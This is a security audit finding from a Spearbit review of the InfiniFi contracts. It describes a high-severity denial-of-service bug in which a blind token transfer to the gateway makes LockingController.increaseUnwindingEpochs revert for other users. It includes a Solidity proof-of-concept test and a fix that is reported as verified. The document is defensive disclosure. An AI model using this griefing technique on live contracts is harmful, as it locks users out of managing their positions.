---
tags:
  - severity/high
  - has/github
  - has/poc
  - lang/solidity
  - platform/spearbit
  - sector/token
protocol: "[[InfiniFi Contracts]]"
auditors:
  - R0bert
report: "https://github.com/spearbit/portfolio/blob/master/pdfs/InfiniFi-Spearbit-Security-Review-March-2025.pdf"
genome:
  - "[[dos-resistance]]"
  - "[[dos/lockup]]"
  - "[[impact/dos/permanent]]"
  - "[[known-pattern]]"
  - "[[specific-state]]"
  - "[[fix/redesign-logic]]"
  - "[[misassumption/external-call-is-safe]]"
  - "[[blast-radius/protocol-wide]]"
---
# Referencing the gateway balance in LockingController.increaseUnwindingEpochs can DoS the

- id: 55052
- impact: HIGH
- protocol: infiniFi contracts
- reporter: R0bert (Spearbit)
- source: https://github.com/spearbit/portfolio/blob/master/pdfs/InfiniFi-Spearbit-Security-Review-March-2025.pdf

## Summary


The report discusses a high-risk bug found in the `LockingController` function of a smart contract called `LockedPositionTokens`. This bug allows holders of tokens to perform blind transfers to a gateway contract, which can result in an attempt to burn a larger amount of tokens than the gateway has approved. The report provides a proof of concept scenario and a recommended solution to fix the bug. The bug has already been fixed by the developers and verified by a third party.

## Details

## Security Audit Report

## Function
### Severity
High Risk

### Context
`LockingController.sol#L253`

### Description
LockedPositionTokens are transferable unrestricted until used to vote. This allows holders to perform blind transfers to the gateway contract. The above capability coupled with the `LockingController.increaseUnwindingEpochs` use of `msg.sender`'s balance means that the existence of any prior transfers to the gateway result in attempting to burnFrom the gateway an amount larger than it will ever approve.

### Proof of Concept

#### Scenario:
- Alice creates a position.
- Bob creates a position.
- Bob sends his position to the gateway.
- Alice attempts to `increaseUnwindingEpochs` and reverts.

The revert is due to the function attempting to `burnFrom` the gateway both her position and Bob's transferred tokens. 

Below is a modified version of `testIncreaseUnwindingEpochs` which now reverts with the addition of Bob's transfer.

```solidity
function testDosIncreaseUnwindingEpochs() public {
    _createPosition(alice, 1000, 10);
    _createPosition(bob, 1000, 10);
    LockedPositionToken liusd = LockedPositionToken(lockingController.shareToken(10));
    
    // Mirrors `testIncreaseUnwindingEpochs` test with the only difference being Bob transfers to the gateway.
    vm.prank(bob);
    liusd.transfer(address(gateway), 1000);
    
    assertEq(
        lockingController.balanceOf(alice),
        1000,
        "Error: Alice's balance after creating first position is not correct"
    );
    assertEq(
        lockingController.rewardWeight(alice),
        1200,
        "Error: Alice's reward weight after creating first position is not correct"
    );
    assertEq(
        lockingController.shares(alice, 10),
        1000,
        "Error: Alice's share after creating first position is not correct"
    );
    assertEq(
        lockingController.shares(alice, 12),
        0,
        "Error: Alice's share after increasing unwinding epochs is not correct"
    );

    vm.startPrank(alice);
    {
        MockERC20(lockingController.shareToken(10)).approve(address(gateway), 1000);
        gateway.increaseUnwindingEpochs(10, 12);
    }
    vm.stopPrank();

    assertEq(
        lockingController.balanceOf(alice),
        1000,
        "Error: Alice's balance after increasing unwinding epochs is not correct"
    ); // unchanged
    assertEq(
        lockingController.rewardWeight(alice),
        1240,
        "Error: Alice's reward weight after increasing unwinding epochs is not correct"
    ); // +40
    assertEq(
        lockingController.shares(alice, 10),
        0,
        "Error: Alice's share after increasing unwinding epochs is not correct"
    ); // -1000
    assertEq(
        lockingController.shares(alice, 12),
        1000,
        "Error: Alice's share after increasing unwinding epochs is not correct"
    ); // +1000
}
```

### Recommendation
In the gateway, make use of the shares variable `uint256 shares = liusd.balanceOf(msg.sender);` and pass as an argument into `LockingController.increaseUnwindingEpochs`. This requires an interface edit to `LockingController` as well.

### Acknowledgments
- **infiniFi**: Fixed in 708f8bf.
- **Spearbit**: Fix verified.
